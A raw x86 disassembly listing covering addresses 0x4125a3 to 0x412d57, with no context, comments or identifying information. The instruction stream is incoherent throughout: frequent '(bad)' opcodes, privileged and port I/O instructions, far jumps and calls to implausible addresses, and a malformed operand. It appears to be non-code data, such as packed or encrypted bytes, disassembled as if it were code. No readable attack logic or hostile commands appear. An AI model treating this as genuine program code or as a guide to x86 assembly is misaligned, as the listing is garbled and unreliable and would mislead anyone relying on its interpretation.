  4125a3:	or     BYTE PTR [ebp+0x5c862c9e],0x41
  4125aa:	jno    0x4125a4
  4125ac:	imul   ebx,DWORD PTR [eax-0x54],0xf142207f
  4125b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b4:	push   es
  4125b5:	jno    0x4125b1
  4125b7:	mov    esi,DWORD PTR [ebx+0x776f7e46]
  4125bd:	jp     0x41259a
  4125bf:	test   dh,dl
  4125c1:	mov    ch,0xb
  4125c3:	(bad)  
  4125c4:	stos   BYTE PTR es:[edi],al
  4125c5:	adc    bl,BYTE PTR [eax+0x6a]
  4125c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125c9:	lahf   
  4125ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125cb:	ret    
  4125cc:	sti    
  4125cd:	outs   dx,DWORD PTR ds:[esi]
  4125ce:	ficom  WORD PTR ss:[ebx+0x49c8edca]
  4125d5:	mov    edx,0x3a9b2d9e
  4125da:	mov    eax,0x68a54db
  4125df:	mov    cs,WORD PTR [edi-0x1f]
  4125e2:	adc    BYTE PTR [ecx+eiz*8-0x18],dh
  4125e6:	sbb    esi,DWORD PTR [ebx]
  4125e8:	ds neg edx
  4125eb:	cmp    ebx,DWORD PTR ds:0x9a63ee61
  4125f1:	lods   al,BYTE PTR ds:[esi]
  4125f2:	call   0xacb7323d
  4125f7:	xor    BYTE PTR [edx],0x37
  4125fa:	mov    ds:0xdc132a8d,al
  4125ff:	sub    DWORD PTR [edi+0x79],eax
  412602:	in     al,0x68
  412604:	and    ch,BYTE PTR ds:0xa4e61e0a
  41260a:	dec    ecx
  41260b:	iret   
  41260c:	inc    edx
  41260d:	les    edi,FWORD PTR [edi]
  41260f:	jne    0x4125ec
  412611:	jae    0x41263a
  412613:	dec    ebp
  412614:	and    ch,BYTE PTR [edx-0x38aeee55]
  41261a:	or     DWORD PTR [edi],edi
  41261c:	sub    BYTE PTR [esi+esi*8],bl
  41261f:	mov    cl,0x66
  412621:	aas    
  412622:	sub    eax,0x163c6e25
  412627:	sub    dl,ch
  412629:	sub    DWORD PTR [esi-0x2e29faf8],edi
  41262f:	inc    ebp
  412630:	adc    ebx,DWORD PTR [edi]
  412632:	cli    
  412633:	adc    edi,DWORD PTR [edi-0x38]
  412636:	push   ds
  412637:	xor    ebx,edi
  412639:	daa    
  41263a:	lods   eax,DWORD PTR ds:[esi]
  41263b:	fcomp  DWORD PTR [eax-0x92a9531]
  412641:	pop    es
  412642:	cmp    bl,dh
  412644:	aaa    
  412645:	ds jmp 0x4125d7
  412648:	sahf   
  412649:	jns    0x412608
  41264b:	jp     0x4126a0
  41264d:	mov    ah,0xa
  41264f:	jb     0x4125ed
  412651:	ss stos DWORD PTR es:[edi],eax
  412653:	push   esi
  412654:	push   0x32
  412656:	sub    eax,DWORD PTR [esi+0x49]
  412659:	xchg   eax,esp
  41265b:	cmp    ah,dh
  41265d:	or     bh,bl
  41265f:	pop    ds
  412660:	ret    0xf6c7
  412663:	push   eax
  412664:	push   edx
  412665:	(bad)  
  412666:	dec    eax
  412667:	sar    dl,0xbf
  41266a:	ror    BYTE PTR [ebx+ebx*2-0x59],cl
  41266e:	test   BYTE PTR [ecx],cl
  412670:	mov    eax,0x9f7ef2c
  412675:	in     al,dx
  412676:	sahf   
  412677:	ret    
  412678:	push   es
  412679:	push   ebx
  41267a:	data16 icebp 
  41267c:	enter  0xb399,0xc9
  412680:	fucomi st,st(4)
  412682:	nop
  412683:	leave  
  412684:	jo     0x4126c9
  412686:	push   ds
  412687:	push   0xc5789347
  41268c:	jg     0x412646
  41268e:	adc    eax,0x1085efaa
  412693:	mov    ch,bh
  412695:	int    0x3b
  412697:	jp     0x41262f
  412699:	fidivr DWORD PTR [esi]
  41269b:	(bad)  
  41269c:	ror    DWORD PTR [edi],cl
  41269e:	mov    esp,0xf36729e5
  4126a3:	test   al,0x89
  4126a5:	cmp    dh,0x14
  4126a8:	push   esp
  4126a9:	mov    dh,0xf3
  4126ab:	pop    es
  4126ac:	test   DWORD PTR [eax+ebp*8+0xacdfeb0],eax
  4126b3:	es pop esi
  4126b5:	sub    ah,BYTE PTR [edi+esi*1]
  4126b8:	addr16 cli 
  4126ba:	in     eax,dx
  4126bb:	test   al,al
  4126bd:	(bad)  
  4126be:	std    
  4126bf:	or     DWORD PTR [edi+ebx*2-0x42],ebp
  4126c3:	sub    al,0x45
  4126c5:	scas   al,BYTE PTR es:[edi]
  4126c6:	push   esi
  4126c7:	pusha  
  4126c8:	cdq    
  4126c9:	xchg   edi,eax
  4126ca:	jecxz  0x41269c
  4126cc:	mov    ecx,0xf9a24e20
  4126d1:	pop    edx
  4126d2:	outs   dx,DWORD PTR ds:[esi]
  4126d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126d4:	xchg   esp,eax
  4126d5:	add    DWORD PTR [esi+0x4d4c9c86],esp
  4126db:	(bad)
  4126de:	es das 
  4126e0:	cmc    
  4126e1:	ss jo  0x412712
  4126e4:	rcr    DWORD PTR [ecx+0x70867f70],cl
  4126ea:	in     al,dx
  4126eb:	in     eax,0xe5
  4126ed:	xchg   BYTE PTR [esi-0xc],bl
  4126f0:	inc    esp
  4126f1:	add    al,0xd6
  4126f3:	xchg   edx,eax
  4126f4:	nop
  4126f5:	mov    dh,BYTE PTR [edx+edi*1-0x7e9129a7]
  4126fc:	in     eax,0x6a
  4126fe:	xchg   ebx,eax
  4126ff:	mov    esi,0xf0855b51
  412704:	fs hlt 
  412706:	jno    0x41276c
  412708:	inc    esi
  412709:	xor    bh,BYTE PTR [eax]
  41270b:	retf   0xe08f
  41270e:	div    esi
  412710:	fs int3 
  412712:	daa    
  412713:	xlat   BYTE PTR ds:[ebx]
  412714:	shl    dl,0x6c
  412717:	pop    ss
  412718:	cmp    eax,0x87e1e430
  41271d:	cwde   
  41271e:	repz add BYTE PTR [edx],bh
  412721:	cli    
  412722:	jno    0x412751
  412724:	aaa    
  412725:	pop    edi
  412726:	jge    0x412746
  412728:	mov    eax,0xa3a98ffd
  41272d:	pop    ss
  41272e:	nop
  41272f:	nop
  412730:	(bad)  
  412731:	repnz mov al,ds:0x986a5cad
  412737:	mov    al,ds:0x55fec884
  41273c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41273d:	icebp  
  41273e:	sbb    dl,BYTE PTR [esi+eax*4]
  412741:	jmp    DWORD PTR [ebx-0x1b]
  412744:	or     eax,0x9e08b91a
  412749:	out    dx,eax
  41274a:	cs mov ebp,0x48d851d3
  412750:	mov    edx,0x73889479
  412755:	adc    BYTE PTR [ecx+0x123d94b1],ch
  41275b:	aaa    
  41275c:	popa   
  41275d:	lock ss retf 
  412760:	jo     0x412748
  412762:	push   0x5b68647b
  412767:	push   ebp
  412768:	xlat   BYTE PTR ds:[ebx]
  412769:	cmp    eax,0x43ba06e8
  41276e:	mov    cl,0x9a
  412770:	pop    esp
  412771:	jae    0x412793
  412773:	aad    0xfb
  412775:	frstor [edi+0x36]
  412778:	dec    edx
  412779:	adc    ecx,edx
  41277b:	js     0x412757
  41277d:	cdq    
  41277e:	ja     0x412709
  412780:	sub    BYTE PTR [eax],ah
  412782:	retf   
  412783:	or     al,0xb9
  412785:	loope  0x412716
  412787:	sub    eax,0x266be51
  41278c:	push   0xffffffcf
  41278e:	sbb    eax,0x62fe9e97
  412793:	adc    BYTE PTR [esi],dl
  412795:	fiadd  DWORD PTR [ecx-0x75]
  412798:	es adc al,0xa4
  41279b:	lds    ebx,FWORD PTR [esi]
  41279d:	mov    ecx,0x7551b3c
  4127a2:	int    0xad
  4127a4:	cs pop edi
  4127a6:	push   esp
  4127a7:	adc    bh,dl
  4127a9:	adc    eax,esp
  4127ab:	mov    esp,0x2ab237f2
  4127b0:	push   ss
  4127b1:	jne    0x4127fc
  4127b3:	(bad)  
  4127b4:	jg     0x4127c6
  4127b6:	jae    0x412754
  4127b8:	ins    BYTE PTR es:[edi],dx
  4127b9:	inc    ebx
  4127ba:	mov    WORD PTR [edx],cs
  4127bc:	cmp    eax,0x46a7231a
  4127c1:	(bad)  
  4127c2:	xchg   esi,eax
  4127c3:	nop
  4127c4:	push   0xffffffe6
  4127c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127c7:	lods   eax,DWORD PTR ds:[esi]
  4127c8:	sar    DWORD PTR ds:0x2d0ead67,1
  4127ce:	dec    esi
  4127cf:	pop    esi
  4127d0:	push   eax
  4127d1:	pop    ebp
  4127d2:	mov    ebp,DWORD PTR [edi+0x3c22b4da]
  4127d8:	arpl   sp,cx
  4127da:	mov    al,0x7
  4127dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127dd:	repz jge 0x412770
  4127e0:	inc    esi
  4127e1:	lock (bad) 
  4127e3:	test   DWORD PTR [ebp-0x6c17e59a],0x1b13bb73
  4127ed:	xor    al,0xb7
  4127ef:	fadd   QWORD PTR [edi]
  4127f1:	popf   
  4127f2:	shl    BYTE PTR [edx-0x23],cl
  4127f5:	retf   0x848b
  4127f8:	jbe    0x4127ad
  4127fa:	cmp    al,BYTE PTR [edi]
  4127fc:	and    al,0xf0
  4127fe:	add    BYTE PTR fs:[ebx+ecx*1],ah
  412802:	add    BYTE PTR ds:0xe2090200,cl
  412808:	and    eax,0x62eee7bd
  41280d:	or     DWORD PTR [ebp+0x25546db],ecx
  412813:	mov    edi,0x38f9bc1e
  412818:	lock xchg edx,eax
  41281a:	sbb    dh,BYTE PTR [ebx]
  41281c:	push   cs
  41281d:	jns    0x4127d3
  41281f:	loope  0x4127ed
  412821:	retf   0x2303
  412824:	jnp    0x4127f3
  412826:	bound  ecx,QWORD PTR [esi+ecx*4+0x2272a49f]
  41282d:	scas   al,BYTE PTR es:[edi]
  41282e:	pop    esp
  41282f:	add    al,0x50
  412831:	les    ecx,FWORD PTR [edi+0x1ea58a68]
  412837:	mov    ebp,0x1422fc1
  41283c:	sti    
  41283d:	dec    ebp
  41283e:	xchg   BYTE PTR [eax],bh
  412840:	sbb    BYTE PTR [edi],dl
  412842:	xlat   BYTE PTR ds:[ebx]
  412843:	fs std 
  412845:	or     eax,0x54ae6761
  41284a:	popf   
  41284b:	jnp    0x4127d1
  41284d:	not    DWORD PTR [esi+eax*1+0x4eaee5c6]
  412854:	cmp    DWORD PTR [ebp-0x25ea382f],edx
  41285a:	inc    esi
  41285b:	inc    esi
  41285c:	mov    esp,0x3d3953a5
  412861:	ret    0x4f8
  412864:	dec    ebx
  412865:	stos   DWORD PTR es:[edi],eax
  412866:	mov    bh,0xe0
  412868:	push   0xed232698
  41286d:	and    al,0x37
  41286f:	lods   al,BYTE PTR ds:[esi]
  412870:	in     eax,dx
  412871:	lock js 0x412842
  412874:	inc    eax
  412875:	dec    esp
  412876:	fstp   DWORD PTR [ebx-0x41]
  412879:	data16 cmp BYTE PTR [ebx+esi*2-0x2c],bh
  41287e:	cmp    eax,0x234e2a87
  412883:	mov    ebx,0x71cf6445
  412888:	push   edx
  412889:	mov    bl,0x93
  41288b:	mov    bh,0x23
  41288d:	push   esp
  41288e:	out    dx,eax
  41288f:	push   ecx
  412890:	dec    esi
  412891:	jo     0x41282a
  412893:	ret    
  412894:	push   cs
  412895:	repz test edx,esp
  412898:	sub    BYTE PTR [ebp+ecx*2-0x44],al
  41289c:	das    
  41289d:	scas   eax,DWORD PTR es:[edi]
  41289e:	mov    bl,BYTE PTR [edx-0x56]
  4128a1:	inc    edi
  4128a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a3:	loop   0x4128fd
  4128a5:	loope  0x41287b
  4128a7:	sahf   
  4128a8:	push   esp
  4128a9:	mov    edx,0xa04d34fc
  4128ae:	xor    al,0xed
  4128b0:	loopne 0x41288b
  4128b2:	mov    bl,0xf3
  4128b4:	or     DWORD PTR [edx],0xffecde3
  4128ba:	aaa    
  4128bb:	mov    al,0x82
  4128bd:	div    DWORD PTR [edx]
  4128bf:	sub    edx,DWORD PTR [ecx+0x62]
  4128c2:	and    BYTE PTR [eax],dh
  4128c4:	ss mov esp,0x610bccbe
  4128ca:	pop    ds
  4128cb:	push   0x52ebca13
  4128d0:	mov    ebp,DWORD PTR [ebx]
  4128d2:	jl     0x4128f1
  4128d4:	push   cs
  4128d5:	sbb    al,0x3a
  4128d7:	xchg   ebp,eax
  4128d8:	adc    eax,0xb04e7011
  4128dd:	test   DWORD PTR [edx-0x22],ebx
  4128e0:	sub    DWORD PTR [ecx],ebp
  4128e2:	mov    ecx,0x5b9a05cc
  4128e7:	adc    al,0x3c
  4128e9:	jo     0x4128c5
  4128eb:	mov    dh,0x2b
  4128ed:	imul   edx,DWORD PTR [ecx+0x3a1cd0fc],0xc847ed13
  4128f7:	fimul  WORD PTR [edi]
  4128f9:	sub    esp,esi
  4128fb:	mov    cl,0x6a
  4128fd:	aam    0x54
  4128ff:	pusha  
  412900:	fimul  DWORD PTR [edi-0x3eacb95]
  412906:	ret    
  412907:	cmp    dh,dh
  412909:	retf   
  41290a:	ins    BYTE PTR es:[edi],dx
  41290b:	pop    edx
  41290c:	jmp    0xe8e5d05c
  412911:	inc    eax
  412912:	and    bh,BYTE PTR [edx+0x4271772f]
  412918:	add    eax,0x5001e40e
  41291d:	sbb    al,BYTE PTR [ebx-0xd515f5b]
  412923:	mov    ch,0x1
  412925:	xor    al,0x14
  412927:	jnp    0x4128b6
  412929:	cld    
  41292a:	hlt    
  41292b:	sar    DWORD PTR [eax+0x1c28ef36],0xad
  412932:	jnp    0x412948
  412934:	sti    
  412935:	ss pop ecx
  412937:	add    eax,0x40fe99ed
  41293c:	cmp    bl,al
  41293e:	rcl    DWORD PTR [ebx],0xd
  412941:	sub    bl,BYTE PTR [edi]
  412943:	push   esp
  412944:	shr    BYTE PTR [edx+0x79],1
  412947:	pop    edi
  412948:	cmp    bh,BYTE PTR [ebp+0x20b63963]
  41294e:	xor    edi,esi
  412950:	test   eax,0x4e7da76f
  412955:	shl    edx,cl
  412957:	repnz shl BYTE PTR [edi],cl
  41295a:	dec    ecx
  41295b:	cs jne 0x412939
  41295e:	imul   ebp,ebx,0x3d
  412961:	(bad)  
  412962:	jmp    0x412928
  412964:	inc    BYTE PTR [esi+0x79]
  412967:	sti    
  412968:	push   0x88ce5bab
  41296d:	push   esp
  41296e:	xor    eax,0x25257bf6
  412973:	bound  esp,QWORD PTR ds:0x63ef31ea
  412979:	xor    dh,0xa3
  41297c:	pop    ss
  41297d:	rcr    DWORD PTR [esi+eax*4-0x3f],1
  412981:	inc    ecx
  412982:	push   ss
  412983:	test   DWORD PTR [edi-0x6c],esi
  412986:	and    DWORD PTR [ecx-0x5f],ebp
  412989:	and    BYTE PTR [ecx],ah
  41298b:	out    dx,al
  41298c:	jae    0x4129fe
  41298e:	push   edi
  41298f:	hlt    
  412990:	mov    edi,0xff4d9b65
  412995:	fild   DWORD PTR [edi-0x5c35427]
  41299b:	loop   0x4129e2
  41299d:	push   ecx
  41299e:	mov    ch,0xa9
  4129a0:	inc    esp
  4129a1:	sbb    DWORD PTR [edi-0x5a2c8c5d],0x5e
  4129a8:	sahf   
  4129a9:	jmp    0x41298f
  4129ab:	sub    edi,edi
  4129ad:	outs   dx,BYTE PTR ds:[esi]
  4129ae:	mov    esi,0x55fbc04b
  4129b3:	sbb    esi,ecx
  4129b5:	(bad)  
  4129b6:	pop    eax
  4129b7:	sbb    BYTE PTR ds:0xcdd83e03,cl
  4129bd:	std    
  4129be:	add    al,BYTE PTR [edi-0x1cb0a82a]
  4129c4:	or     al,0x3e
  4129c6:	pop    eax
  4129c7:	push   ds
  4129c8:	jae    0x4129c3
  4129ca:	sbb    BYTE PTR [ecx+0x4755f8e1],bl
  4129d0:	adc    eax,0xb5f4760c
  4129d5:	sar    cl,1
  4129d7:	or     al,0x5a
  4129d9:	mov    ecx,0xd9400cb4
  4129de:	sbb    eax,0x31aef3c
  4129e3:	add    eax,0x224e3038
  4129e8:	sub    DWORD PTR [ebx+0x68],ecx
  4129eb:	cmp    ebp,DWORD PTR [eax+0x28]
  4129ee:	dec    ecx
  4129ef:	or     al,0xbf
  4129f1:	rcl    DWORD PTR [edx+edi*1-0x1],1
  4129f5:	imul   ecx,DWORD PTR [ebp-0xa7c18db],0x6b
  4129fc:	mov    ch,0xe4
  4129fe:	fstp   DWORD PTR ds:0xad03b90b
  412a04:	dec    edx
  412a05:	ins    BYTE PTR es:[edi],dx
  412a06:	ins    BYTE PTR es:[edi],dx
  412a07:	lea    edx,[eax-0x6e96efc2]
  412a0d:	icebp  
  412a0e:	cwde   
  412a0f:	sub    al,0xc0
  412a11:	icebp  
  412a12:	pop    ss
  412a13:	dec    esi
  412a14:	inc    ebp
  412a15:	pop    es
  412a16:	ret    0x1b2
  412a19:	les    ebp,FWORD PTR [ecx]
  412a1b:	pop    eax
  412a1c:	mov    esi,0x89d7e4d9
  412a21:	aam    0x9e
  412a23:	sahf   
  412a24:	mov    DWORD PTR [ecx+eax*1],ecx
  412a27:	fsub   DWORD PTR [edi+0x5]
  412a2a:	mov    al,ds:0x2464e10c
  412a2f:	add    eax,0x42c7946e
  412a34:	jl     0x4129eb
  412a36:	pop    esp
  412a37:	mov    al,0xa6
  412a39:	loop   0x412a8f
  412a3b:	push   cs
  412a3c:	gs ins DWORD PTR es:[edi],dx
  412a3e:	sub    ebp,DWORD PTR [esi+edi*1-0x72921077]
  412a45:	pusha  
  412a46:	xchg   ecx,eax
  412a47:	jmp    0x1809:0x97aff2e7
  412a4e:	inc    edx
  412a4f:	test   DWORD PTR [ebx],ebp
  412a51:	popa   
  412a52:	pop    edx
  412a53:	clc    
  412a54:	xchg   edx,eax
  412a55:	mov    DWORD PTR [eax+0x23],esi
  412a58:	mov    ebx,0x10700b43
  412a5d:	sar    BYTE PTR [esi+0x6b],cl
  412a60:	jecxz  0x412a83
  412a62:	aas    
  412a63:	pop    ds
  412a64:	repnz xor al,0x7d
  412a67:	out    0x85,al
  412a69:	push   eax
  412a6a:	lock jmp 0xc27c:0xfd1fba9d
  412a72:	xchg   edi,eax
  412a73:	leave  
  412a74:	out    dx,eax
  412a75:	pop    eax
  412a76:	dec    ecx
  412a77:	daa    
  412a78:	lea    ebp,[esi-0x31]
  412a7b:	pop    ds
  412a7c:	sub    eax,ebp
  412a7e:	stc    
  412a7f:	js     0x412a83
  412a81:	xchg   edx,eax
  412a82:	cmp    ah,BYTE PTR ds:0x6a72433a
  412a88:	sbb    al,0x5c
  412a8a:	shr    DWORD PTR [edx+0x18],1
  412a8d:	ficomp DWORD PTR [edx-0x229a7e16]
  412a93:	iret   
  412a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a95:	xchg   DWORD PTR [ebp-0x3b],edi
  412a98:	mov    bh,0x63
  412a9a:	lds    ecx,FWORD PTR [edx+0x42a52c]
  412aa0:	xchg   ebx,eax
  412aa1:	pop    esi
  412aa2:	es nop
  412aa4:	stos   BYTE PTR es:[edi],al
  412aa5:	mov    ecx,0xa982e37f
  412aaa:	dec    ebx
  412aab:	fisttp QWORD PTR [esi]
  412aad:	daa    
  412aae:	sub    eax,0x750ae8a2
  412ab3:	imul   esp,DWORD PTR [edi+esi*1-0x33930404],0xf9378cf9
  412abe:	daa    
  412abf:	sbb    edx,esi
  412ac1:	xor    esi,DWORD PTR [ecx]
  412ac3:	fwait
  412ac4:	mov    es,WORD PTR [esi-0x4c]
  412ac7:	loope  0x412ae7
  412ac9:	addr16 ret 
  412acb:	adc    DWORD PTR [esi],ebp
  412acd:	mov    bl,0xf6
  412acf:	rol    bl,1
  412ad1:	shl    BYTE PTR [ecx],0xfe
  412ad4:	sbb    al,0x3d
  412ad6:	xor    bl,BYTE PTR [ecx+0x16]
  412ad9:	nop
  412ada:	and    edx,DWORD PTR [eax+0x73e1bb9f]
  412ae0:	jbe    0x412a67
  412ae2:	imul   edx,DWORD PTR [edx+0x4547fb8b],0x4d
  412ae9:	fwait
  412aea:	jo     0x412aaf
  412aec:	dec    edi
  412aed:	out    dx,eax
  412aee:	outs   dx,BYTE PTR ds:[esi]
  412aef:	ret    0x4c47
  412af2:	loope  0x412adc
  412af4:	fwait
  412af5:	pop    ecx
  412af6:	xchg   esp,eax
  412af7:	jge    0x412b63
  412af9:	pop    esp
  412afa:	repnz std 
  412afc:	(bad)  
  412afd:	mov    ?,ecx
  412aff:	jnp    0x412b06
  412b01:	aas    
  412b02:	aad    0x28
  412b04:	xor    DWORD PTR [edx],esp
  412b06:	inc    eax
  412b07:	pop    edi
  412b08:	fs mov bh,0xac
  412b0b:	mov    al,0x1f
  412b0d:	jno    0x412ade
  412b0f:	into   
  412b10:	into   
  412b11:	jmp    FWORD PTR [ebp+0x32f64d5c]
  412b17:	(bad)  
  412b18:	xlat   BYTE PTR ds:[ebx]
  412b19:	add    eax,0x620f1ecb
  412b1e:	lods   al,BYTE PTR ds:[esi]
  412b1f:	jbe    0x412afd
  412b21:	ins    BYTE PTR es:[edi],dx
  412b22:	sub    dh,BYTE PTR [ebp+0x1db8eefd]
  412b28:	cmp    ch,BYTE PTR [ecx+0x35]
  412b2b:	in     eax,dx
  412b2c:	je     0x412b57
  412b2e:	pushf  
  412b2f:	mov    cl,0xe8
  412b31:	or     ah,BYTE PTR [ebx]
  412b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b34:	inc    ebx
  412b35:	mov    ah,0x96
  412b37:	test   BYTE PTR [esi-0x76],bh
  412b3a:	mov    bh,0x69
  412b3c:	push   cs
  412b3d:	add    eax,0xde1c62bb
  412b42:	(bad)
  412b46:	pop    esp
  412b47:	and    al,0xe2
  412b49:	xor    BYTE PTR ds:0xc779b348,al
  412b4f:	shl    DWORD PTR [esi+0x7d],0x2a
  412b53:	ds clc 
  412b55:	cdq    
  412b56:	test   al,0xf4
  412b58:	sub    bh,BYTE PTR ds:0x8eae8a93
  412b5e:	dec    esi
  412b5f:	pop    ebp
  412b60:	ins    DWORD PTR es:[edi],dx
  412b61:	xchg   edi,eax
  412b62:	cwde   
  412b63:	es jge 0x412b03
  412b66:	jbe    0x412afa
  412b68:	lods   eax,DWORD PTR ds:[esi]
  412b69:	jae    0x412b89
  412b6b:	imul   esp,ecx,0xd
  412b6e:	adc    BYTE PTR [ecx+0x30],cl
  412b71:	bound  esi,QWORD PTR [ecx+0x4a]
  412b74:	jb     0x412bd0
  412b76:	cmp    bh,BYTE PTR [edx+0x3316d4e7]
  412b7c:	mov    ebx,0x95b928c3
  412b81:	fucom  st(1)
  412b83:	mov    ecx,ds
  412b85:	ins    BYTE PTR es:[edi],dx
  412b86:	mov    esp,DWORD PTR [edx]
  412b88:	(bad)  
  412b89:	adc    BYTE PTR [esi-0x38288630],ah
  412b8f:	jmp    0x5040:0xaa757dc1
  412b96:	int    0x3a
  412b98:	(bad)  [ecx+0x26]
  412b9b:	(bad)  
  412b9c:	cmp    DWORD PTR [ecx-0x398cfd65],edi
  412ba2:	dec    edi
  412ba3:	aad    0x5c
  412ba5:	leave  
  412ba6:	adc    bh,bl
  412ba8:	(bad)  
  412ba9:	sub    dl,BYTE PTR [eax-0x5aa85a14]
  412baf:	popf   
  412bb0:	push   es
  412bb1:	mov    ebx,edx
  412bb3:	inc    ebx
  412bb4:	ss jmp 0x3969e381
  412bba:	cwde   
  412bbb:	cli    
  412bbc:	and    al,0x5c
  412bbe:	xchg   edx,eax
  412bbf:	sahf   
  412bc0:	les    eax,FWORD PTR [edi+ebp*1+0x2]
  412bc4:	fimul  DWORD PTR [ebx+0x25]
  412bc7:	daa    
  412bc8:	lock push cs
  412bca:	sbb    eax,0xe5b6a4c9
  412bcf:	aad    0xa6
  412bd1:	jno    0x412b6a
  412bd3:	das    
  412bd4:	dec    ecx
  412bd5:	daa    
  412bd6:	push   eax
  412bd7:	test   al,0x9a
  412bd9:	or     ch,dl
  412bdb:	fsubr  st,st(1)
  412bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bde:	fnstsw WORD PTR [esi-0x6af3f9f3]
  412be4:	pop    ecx
  412be5:	adc    DWORD PTR [esi+0xd],esp
  412be8:	out    dx,al
  412be9:	fadd   st,st(4)
  412beb:	ins    BYTE PTR es:[edi],dx
  412bec:	jp     0x412c39
  412bee:	cmp    DWORD PTR [ebx+edx*4+0xee0e3ac],0x694c6531
  412bf9:	sub    al,0xcb
  412bfb:	loope  0x412b83
  412bfd:	inc    esi
  412bfe:	int3   
  412bff:	xchg   ebp,eax
  412c00:	in     al,0x7a
  412c02:	fist   DWORD PTR [si+0x12e9]
  412c07:	and    al,al
  412c09:	fiadd  DWORD PTR [edx-0x369aedd4]
  412c0f:	repnz xchg ecx,eax
  412c11:	mov    ch,0x59
  412c13:	ja     0x412bc9
  412c15:	je     0x412bed
  412c17:	test   BYTE PTR [eax+ebp*1],bh
  412c1a:	lahf   
  412c1b:	push   ds
  412c1c:	call   FWORD PTR [ecx+edi*8-0x2893928c]
  412c23:	(bad)  
  412c25:	das    
  412c26:	inc    eax
  412c27:	pop    es
  412c28:	shr    dh,0x26
  412c2b:	jp     0x412bcc
  412c2d:	sbb    BYTE PTR [esi],cl
  412c2f:	push   esp
  412c30:	adc    ah,BYTE PTR [ebx]
  412c32:	pop    ebp
  412c33:	in     al,0x56
  412c35:	into   
  412c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c37:	xor    edi,DWORD PTR [edi]
  412c39:	adc    dl,BYTE PTR [edx-0x604c1b4d]
  412c3f:	test   ebp,0x991c5b45
  412c45:	xchg   ecx,eax
  412c46:	jno    0x412be6
  412c48:	div    BYTE PTR [esi]
  412c4a:	jo     0x412cad
  412c4c:	jge    0x412c7c
  412c4e:	ins    BYTE PTR es:[edi],dx
  412c4f:	(bad)  
  412c50:	(bad)  
  412c51:	fmul   DWORD PTR [esi]
  412c53:	int    0x59
  412c55:	stc    
  412c56:	sub    edi,DWORD PTR [eax+0x4c9f055f]
  412c5c:	lds    esi,FWORD PTR [edx+edi*1]
  412c5f:	mov    al,ds:0xab901340
  412c64:	bound  ebx,QWORD PTR [esi+0xe383fd9]
  412c6a:	jno    0x412cb4
  412c6c:	and    DWORD PTR [ecx+ebp*2-0x43],ecx
  412c70:	or     eax,0x90900c30
  412c75:	fwait
  412c76:	mov    ecx,0xac14fa3d
  412c7b:	retf   
  412c7c:	sub    BYTE PTR [esi],0x54
  412c7f:	repnz in al,dx
  412c81:	adc    cl,BYTE PTR [eax-0x32dcb670]
  412c87:	clc    
  412c88:	add    dl,BYTE PTR [edi+0x67]
  412c8b:	icebp  
  412c8c:	jmp    0x412d01
  412c8e:	(bad)  
  412c8f:	xor    al,0xb1
  412c91:	ja     0x412cc3
  412c93:	and    BYTE PTR [ebx],bl
  412c95:	cmp    eax,0x87cf3553
  412c9a:	es dec ecx
  412c9c:	add    esp,DWORD PTR [eax+0x638602b2]
  412ca2:	dec    bh
  412ca4:	fnstcw WORD PTR [ebx+0x2d]
  412ca7:	dec    ebp
  412ca8:	scas   al,BYTE PTR es:[edi]
  412ca9:	fmul   QWORD PTR [ebx+0x1c9e324e]
  412caf:	xchg   ebx,eax
  412cb0:	xor    al,0x86
  412cb2:	fwait
  412cb3:	pop    es
  412cb4:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412cb6:	mov    dl,dh
  412cb8:	cdq    
  412cb9:	je     0x412c4f
  412cbb:	or     eax,0x8c4780d9
  412cc0:	mov    edi,0x8818e6e0
  412cc5:	aas    
  412cc6:	or     eax,0xff48c649
  412ccb:	pop    edx
  412ccc:	pusha  
  412ccd:	sub    BYTE PTR [edx+ebp*4],ah
  412cd0:	cld    
  412cd1:	mov    ebx,0x334a2972
  412cd6:	or     BYTE PTR [edi-0x4a5c6caa],ch
  412cdc:	leave  
  412cdd:	dec    ebx
  412cde:	ds mov ch,0x22
  412ce1:	xchg   esp,eax
  412ce2:	imul   edx,DWORD PTR [esi+0x2c20427],0xffffffa2
  412ce9:	call   0xcdc1f7d8
  412cee:	jno    0x412d6d
  412cf0:	fldcw  WORD PTR [ebx+0x362e1cd9]
  412cf6:	add    BYTE PTR [edx+eiz*2+0x5c],0xc0
  412cfb:	ja     0x412d05
  412cfd:	scas   eax,DWORD PTR es:[edi]
  412cfe:	shr    DWORD PTR [eax],cl
  412d00:	daa    
  412d01:	ficomp WORD PTR [eax+ecx*1+0x57]
  412d05:	xor    ah,BYTE PTR [eax]
  412d07:	cmc    
  412d08:	sub    edx,DWORD PTR [ebx-0x7e937e8b]
  412d0e:	dec    ebx
  412d0f:	pushf  
  412d10:	mov    ebx,0x5df948a0
  412d15:	sbb    bl,BYTE PTR [ebp+0x4d]
  412d18:	and    dl,al
  412d1a:	adc    al,0xf7
  412d1c:	adc    BYTE PTR [edi+ebx*4-0x51eab4fd],dh
  412d23:	out    0xb8,al
  412d25:	test   al,0xea
  412d27:	rol    BYTE PTR ds:0xb2ca894b,cl
  412d2d:	mov    ch,0x3
  412d2f:	push   ebp
  412d30:	jne    0x412cf3
  412d32:	ficom  DWORD PTR [edx-0x47]
  412d35:	mov    al,BYTE PTR [eax-0xb575cf]
  412d3b:	jne    0x412d83
  412d3d:	in     eax,dx
  412d3e:	xlat   BYTE PTR ds:[ebx]
  412d3f:	(bad)  
  412d40:	mov    ah,0xfd
  412d42:	pop    ss
  412d43:	or     bl,BYTE PTR [eax]
  412d45:	scas   al,BYTE PTR es:[edi]
  412d46:	mov    dl,BYTE PTR [ebx+0xc70a1ac]
  412d4c:	and    al,bl
  412d4e:	and    eax,0xd00cdc9e
  412d53:	jnp    0x412dbe
  412d55:	jne    0x412dd2
  412d57:	cmp    BYTE PTR [eax+0x15],ch
